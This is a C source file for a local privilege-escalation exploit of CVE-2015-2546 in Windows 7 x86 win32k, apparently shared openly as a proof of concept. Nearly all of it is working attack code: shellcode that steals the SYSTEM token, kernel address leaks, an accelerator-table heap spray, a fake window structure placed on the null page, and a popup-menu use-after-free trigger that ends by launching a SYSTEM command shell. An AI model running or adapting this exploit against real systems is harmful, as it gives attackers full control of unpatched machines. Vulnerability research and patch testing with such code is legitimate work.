#include "Struct.h"

PZWALLOCATEVIRTUALMEMORY  My_ZwAllocateVirtualMemory = NULL;
DWORD dwTokenOffset = 0;
DWORD gFlag1 = 0;
DWORD gFlag2 = 0;
HWND hwnd2;
WNDPROC lpPrevWndFunc = NULL;
lHMValidateHandle pHmValidateHandle = NULL;
My_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;

int __stdcall ShellCode(int parameter1, int parameter2, int parameter3, int parameter4)
{
	_asm
	{
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
					 mov eax, [eax + 0xb8]	// Find the process activity list
					 sub eax, 0xb8    		// List traversal
					 cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
					 jnz find_sys_pid

					 // Replace the Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
	}
	return 0;
}

void PrintMsg(const char* formatString, ...)
{
	va_list  va;
	va_start(va, formatString);
	vprintf(formatString, va);
	ExitProcess(0);
}

DWORD64 ntoskrnlbase()
{
	LPVOID lpImageBase[0x100];
	LPDWORD lpcbNeeded = NULL;
	TCHAR lpfileName[1024];

	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, (DWORD64)sizeof(lpImageBase), lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 0x40);

		if (!strcmp((LPSTR)lpfileName, "ntkrnlpa.exe"))
		{
			return lpImageBase[i];
		}
	}
	return NULL;
}

DWORD __stdcall  ptiCurrent()
{
	__asm {
		mov eax, fs:18h		 //eax pointer to TEB
		mov eax, [eax + 40h] //get pointer to Win32ThreadInfo
	}
}

DWORD  InitExploitMem(LPVOID* pAllocAddr)
{
	LPVOID pThreadInfo = ptiCurrent();

	*(FARPROC*)& NtAllocateVirtualMemory = GetProcAddress(
		GetModuleHandleW(L"ntdll"),
		"NtAllocateVirtualMemory");

	if (NtAllocateVirtualMemory == NULL)
	{
		printf("[+] Failed to get function NtAllocateVirtualMemory!!!\n");
		system("pause");
		return;
	}

	PVOID Zero_addr = (PVOID)1;
	SIZE_T RegionSize = 0x1000;

	LONG iret = NtAllocateVirtualMemory(
		INVALID_HANDLE_VALUE,
		&Zero_addr,
		0, 
		&RegionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	// fill fake tagWND struct

	*(PVOID*)(0xD) = pThreadInfo;               // 7-(0x5)    = 8   
	*(BYTE*)(0x1B) = (BYTE)4;                   // 0x1B-(0x5) = 0x16, bServerSideWindowProc change!
	*(PVOID*)(0x65) = (PVOID)ShellCode;         // 0x65-(0x5) = 0x60, lpfnWndProc

	return 1;
}


LRESULT CALLBACK MyWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (uMsg == WM_ENTERIDLE) // Message 
	{
		if (gFlag1 != 1)
		{
			gFlag1 = 1;
			PostMessageA(hWnd, WM_KEYDOWN, 0x28, 0);
			PostMessageA(hWnd, WM_KEYDOWN, 0x27, 0);
			PostMessageA(hWnd, 0x200, 0, 1);
		}
		else
		{
			PostMessageA(hWnd, WM_CLOSE, 0, 0);
		}
	}

	return DefWindowProcA(hWnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK MyMenuProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProcA(hWnd, uMsg, wParam, lParam);
}

HMENU InitPopupMenu()
{
	MENUITEMINFO Item1, Item2;
	HMENU        hMenu1, hMenu2;

	memset(&Item1, 0, sizeof(Item1));
	memset(&Item2, 0, sizeof(Item2));

	hMenu1 = CreatePopupMenu();
	if (hMenu1 == NULL) return 0;

	Item1.cbSize = sizeof(Item1);
	Item1.fMask = MIIM_STRING; // Retrieves or sets the dwTypeData member.
	if (FALSE == InsertMenuItemA(hMenu1, 0, TRUE, &Item1))
	{
		DestroyMenu(hMenu1);
		return NULL;
	}

	hMenu2 = CreatePopupMenu();
	if (hMenu2 == NULL) return NULL;

	static char szMenuText[2] = " ";

	Item2.fMask = MIIM_STRING | MIIM_SUBMENU;
	Item2.dwTypeData = szMenuText;
	Item2.cch = 1;             // length of szMenuText
	Item2.hSubMenu = hMenu1;
	Item2.cbSize = sizeof(Item2);

	if (FALSE == InsertMenuItemA(hMenu2, 0, TRUE, &Item2))
	{
		printf("[+] InsertMenuItem failed,error code is %d !\n", GetLastError());
		DestroyMenu(hMenu1);
		DestroyMenu(hMenu2);
		return NULL;
	}
	return hMenu2;
}


LRESULT CALLBACK NewWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)//back default tagWnd will change!!!
{
	LPACCEL	lpAccel;
	// 处理 1EB 的消息
	if (uMsg == 0x1EB)
	{
		return (LONG)hwnd2;
	}
	else if (uMsg == 0x1F0)
	{
		if (hwnd2 != NULL)
		{
			// #32768窗口进行销毁,tagPopupMenu被释放
			DestroyWindow(hwnd2);
			// Accelerator占用销毁的位置
			lpAccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * 0x5);
			for (int i = 0; i < 50; i++)
			{
				CreateAcceleratorTable(lpAccel, 0x5);
			}
		}
		// 返回值为0绕过判断
		return 0;
	}
	// 处理 1E5 的消息,返回 0x10
	else if (uMsg == 0x1E5)
	{
		return 0x10;
	}
	return CallWindowProcA(lpPrevWndFunc, hWnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WndProcHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	CWPSTRUCT* pWndProcArgs = (CWPSTRUCT*)lParam;

	if (pWndProcArgs->message == 0x1EB || pWndProcArgs->message == 0x1F0 || pWndProcArgs->message == 0x1E5) // MN_FINDMENUWINDOWFROMPODWORD
	{
		if (gFlag2 != 3)
		{
			gFlag2++;
			lpPrevWndFunc = (WNDPROC)SetWindowLongA(
				pWndProcArgs->hwnd,
				GWL_WNDPROC,
				(LONG)NewWndProc);        // LONG
		}

	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("[+] Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("[+] Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("[+] Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

DWORD WINAPI ThreadProc(LPVOID lParam)
{
	WNDCLASS    wc;
	HWND        hWnd;
	DWORD       result = 0;
	LPVOID 		pAllocAddr;
	WNDCLASS    nw;
	HACCEL hAccel[50];
	PUSER_HANDLE_ENTRY Address;
	DWORD index;
	PUCHAR pAcceleratorTable[50];
	memset(&wc, 0, sizeof(wc));
	memset(&nw, 0, sizeof(nw));

	wc.lpfnWndProc = MyWndProc;
	wc.lpszClassName = "test";

	// 获取内核地址
	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		PrintMsg("[+] Failed to locate HmValidateHandle, exiting\n");
	}

	RegisterClassA(&nw);
	RegisterClassA(&wc);

	// 创建主窗口
	hWnd = CreateWindowExA(0, wc.lpszClassName, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0);

	// 泄露主窗口地址
	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hWnd, 1);
	printf("[+] tagWnd at : 0x%p\n", tagWND);

	PSHAREDINFO pSharedInfo = (PSHAREDINFO)GetProcAddress(
		GetModuleHandle(L"user32.dll"), 
		"gSharedInfo"
	);

	printf("[+] gSharedInfo at : 0x%p\n", pSharedInfo);
	PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo->aheList;
	LPACCEL	lpAccel = (LPACCEL)LocalAlloc(
		LPTR, 
		sizeof(ACCEL) * 0x5 // 大小 0x8 * 0x5 = 0x28 与 tagPOPUPMENU 大小相同
	);
	// 创建很多加速键表,实现堆喷
	for (int i = 0; i < 50; i++)
	{
		hAccel[i] = CreateAcceleratorTable(lpAccel, 0x5);
		index = LOWORD(hAccel[i]);
		Address = &gHandleTable[index];
		pAcceleratorTable[i] = (PUCHAR)Address->pKernel;
		printf("[+] Create Accelerator pKernelAddress at : 0x%p\n", pAcceleratorTable[i]);
	}
	// 释放双数的加速键表,制造空洞
	for (int i = 2; i < 50; i = i + 5)
	{
		DestroyAcceleratorTable(hAccel[i]);
		printf("[+] Destroy Accelerator pKernelAddress at : 0x%p\n", pAcceleratorTable[i]);
	}

	// 创建该类型的窗口创建tagWND后,会自动生成tagPopupMenu,占之前Accelerator释放的坑
	hwnd2 = CreateWindowExA(0, "#32768", 0, 0, -1, -1, 0, 0, 0, 0, 0, 0);

	if (!SetWindowLongA(hwnd2, GWL_WNDPROC, (LONG)& MyMenuProc))
	{
		return 0;
	}

	PTHRDESKHEAD tagWND2 = (PTHRDESKHEAD)pHmValidateHandle(hwnd2, 1);
	PVOID tagPopupmenu = tagWND2->pSelf;
	printf("[+] tagWnd2 at pKernel Address : 0x%p\n", tagWND2->pSelf);

	if (hwnd2 == NULL) return 0;
	if (hWnd == NULL) return 0;

	InitExploitMem(&pAllocAddr);// Create 0 page exploit set shellcode

	HMENU hMenu2 = InitPopupMenu();// Create pop up menu

	if (hMenu2)
	{
		DWORD dwThreadId = GetCurrentThreadId();
		if (SetWindowsHookExA(WH_CALLWNDPROC, WndProcHook, 0, dwThreadId))
		{
			// trigger
			Sleep(1000);
			if (TrackPopupMenu(hMenu2, 0, -10000, -10000, 0, hWnd, 0))//Create Popup Menu in hWnd
			{
				PostMessageA(hWnd, 0, 0, 0);//if CrEate Success send Button Click Message
				result = 1;
			}
		}
	}
	DestroyWindow(hWnd);
	if (hwnd2 != NULL)
	{
		DestroyWindow(hwnd2);
	}
	if (hMenu2)
	{
		DestroyMenu(hMenu2);
	}
	UnhookWindowsHook(WH_CALLWNDPROC, WndProcHook);
	VirtualFree(pAllocAddr, 0, MEM_RELEASE);
	return result;
}


int main()
{
	/*
	*[+] Learn from k0shl:https://github.com/k0keoyo/CVE-2015-2546-Exploit/blob/master/_CVE_2015_2546_exp.cpp
	*[+] Hope can help you :)
	*/
	printf("[+] CVE-2015-2546\n[+] Writen by Thunder J\n");
	printf("[+] Exploit in Windows 7 x86 sp1\n");

	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ThreadProc, 0, 0, 0);

	if (WaitForSingleObject(hThread, 300000))
	{
		TerminateThread(hThread, 0);
		PrintMsg("[+] Error code is : %d\n", GetLastError());
	}

	CreateCmd();
	
	return 0;
}
